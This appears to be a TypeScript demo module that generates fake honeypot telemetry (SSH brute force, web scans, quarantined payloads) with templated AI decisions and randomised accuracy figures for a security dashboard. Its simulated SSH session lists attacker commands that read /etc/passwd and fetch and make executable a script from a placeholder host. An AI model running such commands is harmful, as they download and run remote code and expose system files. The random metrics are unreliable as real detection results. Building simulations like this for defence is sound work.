// Demo engine: generates synthetic honeypot telemetry (§24/§25).
// All IPs use documentation ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24).

import type {
  AIAnalysis,
  AttackEvent,
  Attacker,
  AttackType,
  DemoSession,
  Honeypot,
  Severity,
  ThreatIndicator,
} from '../types'

export type WsEventName =
  | 'new_attack'
  | 'new_session'
  | 'honeypot_update'
  | 'ai_decision'
  | 'adaptation'
  | 'threat_intelligence'
  | 'reset'

export interface WsEvent {
  event: WsEventName
  data: any
}

type Listener = (e: WsEvent) => void

function pad(n: number, w = 2) {
  return String(n).padStart(w, '0')
}
function iso(d: Date) {
  return d.toISOString()
}

const SSH_IPS = ['192.0.2.45', '192.0.2.14', '192.0.2.118', '192.0.2.201', '192.0.2.66']
const WEB_IPS = ['198.51.100.73', '198.51.100.22', '198.51.100.149', '198.51.100.90', '198.51.100.31']
const PAYLOAD_IPS = ['203.0.113.91', '203.0.113.12', '203.0.113.157', '203.0.113.44', '203.0.113.230']

const USERNAMES = ['root', 'admin', 'ubuntu', 'oracle', 'postgres', 'test', 'guest', 'backup']
const WEB_PATHS = ['/login', '/admin', '/config', '/api/users', '/wp-login.php', '/.env', '/.git/config', '/phpmyadmin', '/search', '/upload']
const PAYLOAD_NAMES = ['sample.bin', 'update.pkg', 'invoice.scr', 'report.exe', 'photo.jpg', 'drivers.zip', 'keylogger.dat', 'docx']
const PAYLOAD_TYPES = ['PE32 executable', 'ZIP archive', 'Script', 'Java class', 'PDF', 'ELF binary']
const SERVICES = ['ssh', 'http', 'https', 'ftp']

let seq = 0
function nextId(prefix: string) {
  seq += 1
  return `${prefix}-${pad(seq, 4)}`
}
function pick<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)]
}
function rint(a: number, b: number) {
  return Math.floor(a + Math.random() * (b - a + 1))
}
function rfloat(a: number, b: number, d = 2) {
  return Number((a + Math.random() * (b - a)).toFixed(d))
}

const SHA_SEED = '0123456789abcdef'
function sha() {
  let s = ''
  for (let i = 0; i < 64; i++) s += SHA_SEED[Math.floor(Math.random() * SHA_SEED.length)]
  return s
}

export class DemoEngine {
  events: AttackEvent[] = []
  attackers: Map<string, Attacker> = new Map()
  honeypots: Honeypot[] = []
  adaptations: any[] = []
  aiAnalyses: AIAnalysis[] = []
  sessions: DemoSession[] = []
  indicators: ThreatIndicator[] = []
  running = false
  private timer: ReturnType<typeof setInterval> | null = null
  private listeners = new Set<Listener>()
  private lastEventIp = ''

  constructor() {
    this.seedHoneypots()
    this.bootstrap()
  }

  // ---- subscriptions (WebSocket-style) ----
  subscribe(fn: Listener) {
    this.listeners.add(fn)
    return () => this.listeners.delete(fn)
  }
  private emit(event: WsEventName, data: any) {
    const e: WsEvent = { event, data }
    this.listeners.forEach((l) => l(e))
  }
  private tick(fn: () => void) {
    fn()
  }

  // ---- lifecycle ----
  start() {
    if (this.running) return
    this.running = true
    this.timer = setInterval(() => this.tick(() => this.generateRandom()), 2200)
  }
  pause() {
    this.running = false
    if (this.timer) clearInterval(this.timer)
    this.timer = null
  }
  reset() {
    this.pause()
    this.events = []
    this.attackers = new Map()
    this.adaptations = []
    this.aiAnalyses = []
    this.sessions = []
    this.indicators = []
    seq = 0
    this.seedHoneypots()
    this.bootstrap()
    this.emit('reset', {})
  }

  // ---- seed honeypots (§11) ----
  private seedHoneypots() {
    const now = new Date()
    this.honeypots = [
      {
        id: 'HP-01', name: 'SSH-01', type: 'SSH', service: 'ssh', status: 'active',
        interaction_level: 'MEDIUM', ai_enabled: true, ai_state: 'STABLE', sessions: 38,
        current_threat: 'None', last_adaptation: null,
      },
      {
        id: 'HP-02', name: 'WEB-01', type: 'Web', service: 'http', status: 'active',
        interaction_level: 'MEDIUM', ai_enabled: true, ai_state: 'STABLE', sessions: 51,
        current_threat: 'None', last_adaptation: null,
      },
      {
        id: 'HP-03', name: 'FILE-01', type: 'File', service: 'ftp', status: 'active',
        interaction_level: 'MEDIUM', ai_enabled: true, ai_state: 'STABLE', sessions: 16,
        current_threat: 'None', last_adaptation: null,
      },
    ]
  }

  // ---- bootstrap with synthetic data so pages are never empty ----
  private bootstrap() {
    const now = Date.now()
    for (let i = 0; i < 14; i++) {
      this.makeEvent(new Date(now - i * 40000 - Math.random() * 20000))
    }
    this.honeypots.forEach((hp) => {
      const e = this.events.find((ev) => ev.target_honeypot === hp.name)
      if (e) {
        hp.current_threat = e.attack_type
        hp.current_severity = e.severity
        hp.last_adaptation = new Date(now - 60000).toISOString()
      }
    })
  }

  // ---- event generators ----
  private makeEvent(date: Date): AttackEvent {
    let ev: AttackEvent
    const r = Math.random()
    if (r < 0.45) ev = this.genSSH(date)
    else if (r < 0.8) ev = this.genWeb(date)
    else ev = this.genPayload(date)
    this.events.unshift(ev)
    if (this.events.length > 600) this.events.length = 600
    this.ingest(ev)
    return ev
  }

  private genSSH(date: Date): AttackEvent {
    const ip = pick(SSH_IPS)
    const attempts = rint(20, 140)
    const nUsers = rint(2, 6)
    const usernames: string[] = []
    for (let i = 0; i < nUsers; i++) usernames.push(pick(USERNAMES))
    const sev: Severity = attempts > 100 ? 'critical' : attempts > 60 ? 'high' : 'medium'
    const conf = rfloat(0.88, 0.99)
    this.lastEventIp = ip
    return {
      id: nextId('EVT'), timestamp: iso(date), attack_type: 'SSH Brute Force',
      source_ip: ip, target_honeypot: 'SSH-01', target_service: 'ssh',
      severity: sev, confidence: conf, status: 'blocked', session_id: nextId('A'),
      attempts, usernames,
    }
  }

  private genWeb(date: Date): AttackEvent {
    const ip = pick(WEB_IPS)
    const requests = rint(30, 200)
    const uniquePaths = rint(8, 45)
    const sev: Severity = requests > 150 ? 'high' : requests > 80 ? 'medium' : 'low'
    const conf = rfloat(0.85, 0.96)
    this.lastEventIp = ip
    return {
      id: nextId('EVT'), timestamp: iso(date), attack_type: 'Web Scanner',
      source_ip: ip, target_honeypot: 'WEB-01', target_service: 'http',
      severity: sev, confidence: conf, status: 'observed', session_id: nextId('A'),
      requests, unique_paths: uniquePaths,
      method: pick(['GET', 'GET', 'POST', 'HEAD']),
    }
  }

  private genPayload(date: Date): AttackEvent {
    const ip = pick(PAYLOAD_IPS)
    const sev: Severity = 'critical'
    this.lastEventIp = ip
    return {
      id: nextId('EVT'), timestamp: iso(date), attack_type: 'Payload Delivery',
      source_ip: ip, target_honeypot: pick(['WEB-01', 'FILE-01']), target_service: 'ftp',
      severity: sev, confidence: rfloat(0.97, 1), status: 'quarantined', session_id: nextId('A'),
      filename: pick(PAYLOAD_NAMES), file_type: pick(PAYLOAD_TYPES),
      file_size: rint(1024, 1024 * 1024 * 4), sha256: sha(),
    }
  }

  // ---- ingest: update attacker, adapt honeypot, create AI analysis + adaptation + indicators ----
  private ingest(ev: AttackEvent) {
    this.updateAttacker(ev)
    this.adaptHoneypot(ev)
    const analysis = this.createAIAnalysis(ev)
    this.aiAnalyses.unshift(analysis)
    this.makeSession(ev)
    this.updateIndicators(ev)
    this.emit('new_attack', { event: ev, analysis })
    this.emit('ai_decision', { event_id: ev.id, decision: analysis.decision, confidence: analysis.confidence, risk_score: analysis.risk_score })
  }

  private updateAttacker(ev: AttackEvent) {
    let a = this.attackers.get(ev.source_ip)
    if (!a) {
      a = {
        id: nextId('ATT'), source_ip: ev.source_ip, first_seen: ev.timestamp, last_seen: ev.timestamp,
        total_events: 0, total_sessions: 0, attack_types: [], targeted_services: [],
        severity: 'low', confidence: ev.confidence, risk_score: 0,
        behavior_stages: ['Reconnaissance'], attack_frequency: 1,
        avg_session_duration_s: 0, unique_commands: 0, unique_endpoints: 1,
        repeated_actions: 0, escalation: false, persistence: false,
      }
      this.attackers.set(ev.source_ip, a)
    }
    a.total_events += 1
    if (!a.attack_types.includes(ev.attack_type)) a.attack_types.push(ev.attack_type)
    if (!a.targeted_services.includes(ev.target_service)) a.targeted_services.push(ev.target_service)
    a.last_seen = ev.timestamp
    if (ev.attack_type === 'Payload Delivery') a.severity = 'critical'
    else if (ev.severity === 'high' && a.severity !== 'critical') a.severity = 'high'
    else if (a.severity === 'low') a.severity = 'medium'
    a.confidence = Math.max(a.confidence, ev.confidence)
    a.risk_score = Math.min(100, a.risk_score + this.riskDelta(ev))
    this.growBehavior(a, ev)
  }

  private growBehavior(a: Attacker, ev: AttackEvent) {
    a.attack_frequency += 1
    a.unique_endpoints += ev.attack_type === 'Web Scanner' ? 1 : 0
    a.repeated_actions += ev.attack_type === 'SSH Brute Force' ? 1 : 0
    if (ev.attack_type === 'Payload Delivery') a.persistence = true
    if (a.total_events > 4) a.escalation = true
    const stageSeq = ['Reconnaissance', 'Service Discovery', 'Credential Attempts']
    if (ev.attack_type === 'Web Scanner' && !a.behavior_stages.includes('Service Discovery')) {
      a.behavior_stages.push('Service Discovery')
    }
    if (ev.attack_type === 'SSH Brute Force' && !a.behavior_stages.includes('Credential Attempts')) {
      a.behavior_stages.push('Credential Attempts')
    }
    if (a.behavior_stages.includes('Credential Attempts') && a.total_events > 3 && !a.behavior_stages.includes('Interactive Session')) {
      a.behavior_stages.push('Interactive Session')
      a.behavior_stages.push('Command Activity')
    }
    if (ev.attack_type === 'Payload Delivery' && !a.behavior_stages.includes('Payload Attempt')) {
      a.behavior_stages.push('Payload Attempt')
    }
    a.behavior_stages = Array.from(new Set(a.behavior_stages))
  }

  private riskDelta(ev: AttackEvent): number {
    const sev: Record<Severity, number> = { low: 8, medium: 16, high: 26, critical: 40 }
    return sev[ev.severity]
  }

  private adaptHoneypot(ev: AttackEvent) {
    const hp = this.honeypots.find((h) => h.name === ev.target_honeypot)
    if (!hp) return
    hp.current_threat = ev.attack_type
    hp.current_severity = ev.severity
    hp.sessions += 1
    const prevLevel = hp.interaction_level
    // Adaptation triggers based on observed behavior (§10, §24)
    let decision = ''
    let cfg = ''
    let result = ''
    if (ev.attack_type === 'SSH Brute Force') {
      decision = 'Increase interaction'
      hp.interaction_level = 'HIGH'
      cfg = 'Enable decoy SSH responses'
      result = 'Session captured'
    } else if (ev.attack_type === 'Web Scanner') {
      decision = 'Expose decoy endpoint'
      hp.interaction_level = 'MEDIUM'
      cfg = 'Expose decoy /api endpoint'
      result = 'More requests observed'
    } else {
      decision = 'Quarantine simulation'
      hp.interaction_level = 'HIGH'
      cfg = 'Enable upload sandbox'
      result = 'Payload recorded'
    }
    hp.ai_state = 'ADAPTING'
    const adp = {
      id: nextId('ADP'), timestamp: ev.timestamp, honeypot_id: hp.id,
      honeypot_name: hp.name, trigger: this.triggerText(ev), decision,
      configuration_changed: cfg, result, event_id: ev.id,
    }
    this.adaptations.unshift(adp)
    if (this.adaptations.length > 200) this.adaptations.length = 200
    hp.last_adaptation = ev.timestamp
    setTimeout(() => {
      hp.ai_state = 'STABLE'
      this.emit('honeypot_update', { ...hp })
    }, 3000)
    this.emit('adaptation', adp)
    this.emit('honeypot_update', { action: 'adapt', honeypot: hp, from: prevLevel })
  }

  private triggerText(ev: AttackEvent): string {
    if (ev.attack_type === 'SSH Brute Force') return `${ev.attempts} authentication attempts from ${ev.source_ip}`
    if (ev.attack_type === 'Web Scanner') return `Scanner detected from ${ev.source_ip} (${ev.requests} requests)`
    return `Suspicious upload ${ev.filename} from ${ev.source_ip}`
  }

  private createAIAnalysis(ev: AttackEvent): AIAnalysis {
    const risk = Math.min(100, this.riskDelta(ev) + (ev.severity === 'critical' ? 20 : 8) + Math.round(ev.confidence * 20))
    const level: Severity = risk >= 76 ? 'critical' : risk >= 51 ? 'high' : risk >= 26 ? 'medium' : 'low'
    let pattern = 'Automated Credential Guessing'
    let observed = `${ev.attempts ?? ev.requests ?? 1} ${ev.attack_type === 'SSH Brute Force' ? 'authentication attempts' : ev.attack_type === 'Web Scanner' ? 'requests' : 'file uploads'} from the same source`
    let decision = 'Extend monitored session'
    let rec = 'Continue observation'
    let expl = `Detected ${ev.attack_type.toLowerCase()} with confidence ${(ev.confidence * 100).toFixed(0)}%.`
    if (ev.attack_type === 'SSH Brute Force') {
      pattern = 'Automated Credential Guessing'; decision = 'Activate decoy SSH responses'; rec = 'Monitor for successful authentication and post-login commands'
    } else if (ev.attack_type === 'Web Scanner') {
      pattern = 'Automated Endpoint Probing'; observed = `${ev.requests} requests across ${ev.unique_paths} unique paths from the same source`
      decision = 'Expose decoy endpoint'; rec = 'Log endpoints requested and parameter probing'
    } else {
      pattern = 'Malicious Payload Delivery'; observed = `Upload of ${ev.filename} (${ev.file_type}, ${ev.file_size} bytes) from same source`
      decision = 'Quarantine and sandbox'; rec = 'Hash the file and isolate the session'
      expl = `Suspicious file upload quarantined. SHA-256 generated for indicator lookups.`
    }
    return {
      event_id: ev.id, session_id: ev.session_id, classification: ev.attack_type, confidence: ev.confidence,
      risk_score: risk, risk_level: level, behavior_pattern: pattern, observed, decision, recommendation: rec, explanation: expl,
      features: this.featuresFor(ev),
    }
  }

  private featuresFor(ev: AttackEvent): { name: string; value: number }[] {
    const f: { name: string; value: number }[] = []
    const add = (name: string, v: number) => f.push({ name, value: Number(v.toFixed(2)) })
    if (ev.attack_type === 'SSH Brute Force') {
      add('Authentication attempt rate', ev.attempts! / 5)
      add('Failed/successful login ratio', rfloat(40, 60))
      add('Unique usernames', ev.usernames!.length)
      add('Session duration (min)', rfloat(4, 18))
      add('Command frequency', rfloat(2, 18))
    } else if (ev.attack_type === 'Web Scanner') {
      add('Request frequency (req/s)', rfloat(3, 22))
      add('Unique endpoints', ev.unique_paths!)
      add('Sequential probing', rint(20, 80))
      add('Suspicious parameter patterns', rint(3, 22))
    } else {
      add('Upload size (KB)', ev.file_size! / 1024)
      add('Payload risk', rfloat(80, 100))
      add('Type rarity', rfloat(70, 100))
      add('Escalation indicator', 1)
    }
    return f
  }

  private makeSession(ev: AttackEvent) {
    const start = new Date(ev.timestamp)
    const timeline = [
      { time: iso(new Date(start.getTime() - 140000)), label: 'Connection established', kind: 'connect' },
    ]
    if (ev.attack_type === 'SSH Brute Force') {
      timeline.push({ time: iso(new Date(start.getTime() - 120000)), label: 'Authentication attempt', kind: 'auth' })
      timeline.push({ time: iso(new Date(start.getTime() - 110000)), label: 'Authentication failed', kind: 'fail' })
      timeline.push({ time: iso(new Date(start.getTime() - 60000)), label: 'Repeated attempts detected', kind: 'warn' })
      timeline.push({ time: ev.timestamp, label: 'AI adaptation triggered', kind: 'ai' })
      timeline.push({ time: iso(new Date(start.getTime() + 20000)), label: 'Session captured', kind: 'capture' })
    } else if (ev.attack_type === 'Web Scanner') {
      timeline.push({ time: iso(new Date(start.getTime() - 150000)), label: 'GET /login 200', kind: 'req' })
      timeline.push({ time: iso(new Date(start.getTime() - 100000)), label: 'GET /admin 404', kind: 'req' })
      timeline.push({ time: iso(new Date(start.getTime() - 50000)), label: 'Repeated scanning detected', kind: 'warn' })
      timeline.push({ time: ev.timestamp, label: 'AI adaptation triggered', kind: 'ai' })
      timeline.push({ time: iso(new Date(start.getTime() + 15000)), label: 'Session captured', kind: 'capture' })
    } else {
      timeline.push({ time: iso(new Date(start.getTime() - 130000)), label: 'File upload attempt', kind: 'req' })
      timeline.push({ time: iso(new Date(start.getTime() - 120000)), label: 'File identified as suspicious', kind: 'warn' })
      timeline.push({ time: ev.timestamp, label: 'Quarantined · file hashed', kind: 'capture' })
      timeline.push({ time: iso(new Date(start.getTime() + 20000)), label: 'AI adaptation triggered', kind: 'ai' })
    }
    const s: DemoSession = {
      id: ev.session_id, attacker_ip: ev.source_ip, target_honeypot: ev.target_honeypot,
      attack_type: ev.attack_type, severity: ev.severity, confidence: ev.confidence,
      status: ev.status, start_time: iso(start), end_time: null, event_count: ev.attempts ?? ev.requests ?? 1,
      timeline,
    }
    if (s.attack_type === 'SSH Brute Force') {
      s.commands = ['ls -la', 'cat /etc/passwd', 'wget http://x/s.sh', 'chmod +x s.sh']
    }
    this.sessions.unshift(s)
    if (this.sessions.length > 300) this.sessions.length = 300
    this.emit('new_session', s)
  }

  private updateIndicators(ev: AttackEvent) {
    let ind = this.indicators.find((i) => i.type === 'ip' && i.label === ev.source_ip)
    if (!ind) {
      ind = { type: 'ip', id: nextId('IND'), label: ev.source_ip, first_seen: ev.timestamp, last_seen: ev.timestamp, events: 0, attacks: [], severity: 'low' }
      this.indicators.unshift(ind)
    }
    ind.events += 1
    ind.last_seen = ev.timestamp
    if (!ind.attacks.includes(ev.attack_type)) ind.attacks.push(ev.attack_type)
    if (ev.severity === 'high' && ind.severity !== 'critical') ind.severity = 'high'
    if (ev.severity === 'critical') ind.severity = 'critical'

    if (ev.attack_type === 'Payload Delivery' && ev.sha256) {
      let h = this.indicators.find((i) => i.type === 'hash' && i.label === ev.sha256)
      if (!h) {
        h = { type: 'hash', id: nextId('IND'), label: ev.sha256, first_seen: ev.timestamp, last_seen: ev.timestamp, events: 1, attacks: ['Payload Delivery'], severity: 'critical', detail: ev.filename }
        this.indicators.unshift(h)
      }
    }
    this.emit('threat_intelligence', { indicators: this.indicators.slice(0, 8) })
  }

  // ---- public queries ----
  getSummary() {
    const highCritical = this.events.filter((e) => e.severity === 'high' || e.severity === 'critical').length
    return {
      active_attacks: this.attackers.size ? Math.min(20, this.running ? this.attackers.size : 6) : 3,
      total_events: this.events.length,
      unique_attackers: this.attackers.size || 4,
      high_critical_threats: highCritical,
      active_honeypots: this.honeypots.filter((h) => h.status === 'active').length,
      ai_adaptations: this.adaptations.length,
      sessions_captured: this.sessions.length,
      detection_accuracy: Number((0.93 + Math.random() * 0.04).toFixed(3)),
    }
  }
  getEvents() {
    return [...this.events]
  }
  getAttackers(): Attacker[] {
    return Array.from(this.attackers.values())
  }
  getHoneypots(): Honeypot[] {
    return [...this.honeypots]
  }
  getAdaptations(): any[] {
    return [...this.adaptations]
  }
  getAnalyses(): AIAnalysis[] {
    return [...this.aiAnalyses]
  }
  getSessions(): DemoSession[] {
    return [...this.sessions]
  }
  getIndicators(): ThreatIndicator[] {
    return [...this.indicators]
  }

  generateSSH() {
    this.tick(() => {
      for (let i = 0; i < 2; i++) {
        const ip = pick(SSH_IPS); this.lastEventIp = ip
        this.makeEvent(new Date())
      }
      return
    })
  }
  generateWeb() {
    this.tick(() => {
      this.lastEventIp = pick(WEB_IPS)
      this.makeEvent(new Date())
    })
  }
  generatePayload() {
    this.tick(() => {
      const ip = pick(PAYLOAD_IPS); this.lastEventIp = ip
      this.makeEvent(new Date())
    })
  }
  generateRandom() {
    const r = Math.random()
    if (r < 0.4) this.generateSSH()
    else if (r < 0.75) this.generateWeb()
    else this.generatePayload()
  }
}

export const demo = new DemoEngine()
